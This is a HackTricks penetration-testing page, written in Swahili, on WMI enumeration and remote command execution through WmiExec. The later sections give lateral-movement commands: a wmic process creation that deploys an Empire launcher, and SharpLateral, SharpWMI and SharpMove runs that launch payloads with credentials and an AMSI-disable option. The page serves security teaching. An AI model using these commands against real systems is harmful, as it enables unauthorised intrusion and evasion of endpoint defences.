# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## Jinsi Inavyofanya Kazi

Mchakato unaweza kufunguliwa kwenye mwenyeji ambapo jina la mtumiaji na ama nenosiri au hash vinajulikana kupitia matumizi ya WMI. Amri zinafanywa kwa kutumia WMI na Wmiexec, ikitoa uzoefu wa shell wa nusu-interactive.

**dcomexec.py:** Kutumia mwisho tofauti za DCOM, skripti hii inatoa shell ya nusu-interactive inayofanana na wmiexec.py, hasa ikitumia kitu cha DCOM cha ShellBrowserWindow. Hivi sasa inasaidia MMC20. Maombi, Windows za Shell, na vitu vya Shell Browser Window. (chanzo: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))

## Misingi ya WMI

### Namespace

Imeandaliwa katika muundo wa hierarchi ya directory, kontena la juu la WMI ni \root, chini ya ambayo directories za ziada, zinazojulikana kama namespaces, zimepangwa. 
Amri za kuorodhesha namespaces:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Darasa ndani ya namespace linaweza kuorodheshwa kwa kutumia:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Darasa**

Kujua jina la darasa la WMI, kama win32_process, na namespace iliyo ndani yake ni muhimu kwa operesheni yoyote ya WMI. Amri za kuorodhesha madarasa yanayoanza na `win32`:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Kuitwa kwa darasa:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Methods

Mbinu, ambazo ni kazi moja au zaidi zinazoweza kutekelezwa za madarasa ya WMI, zinaweza kutekelezwa.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI Enumeration

### WMI Service Status

Amri za kuthibitisha ikiwa huduma ya WMI inafanya kazi:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Taarifa za Mfumo na Mchakato

Kukusanya taarifa za mfumo na mchakato kupitia WMI:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Kwa washambuliaji, WMI ni chombo chenye nguvu cha kuorodhesha data nyeti kuhusu mifumo au maeneo.
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
Kuchunguza kwa mbali WMI kwa habari maalum, kama wasimamizi wa ndani au watumiaji walioingia, kunawezekana kwa ujenzi wa amri kwa makini.

### **Kuchunguza WMI kwa Mikono kwa Mbali**

Utambuzi wa kimya wa wasimamizi wa ndani kwenye mashine ya mbali na watumiaji walioingia unaweza kufanywa kupitia maswali maalum ya WMI. `wmic` pia inasaidia kusoma kutoka kwa faili ya maandiko ili kutekeleza amri kwenye nodi nyingi kwa wakati mmoja.

Ili kutekeleza mchakato kwa mbali kupitia WMI, kama vile kupeleka wakala wa Empire, muundo wa amri ifuatayo unatumika, huku utekelezaji wa mafanikio ukionyeshwa na thamani ya kurudi "0":
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Mchakato huu unaonyesha uwezo wa WMI wa utekelezaji wa mbali na uainishaji wa mfumo, ukisisitiza matumizi yake kwa usimamizi wa mfumo na pentesting.

## Zana za Kiotomatiki

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- Unaweza pia kutumia **Impacket's `wmiexec`**.


## Marejeo

- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)


{{#include ../../banners/hacktricks-training.md}}
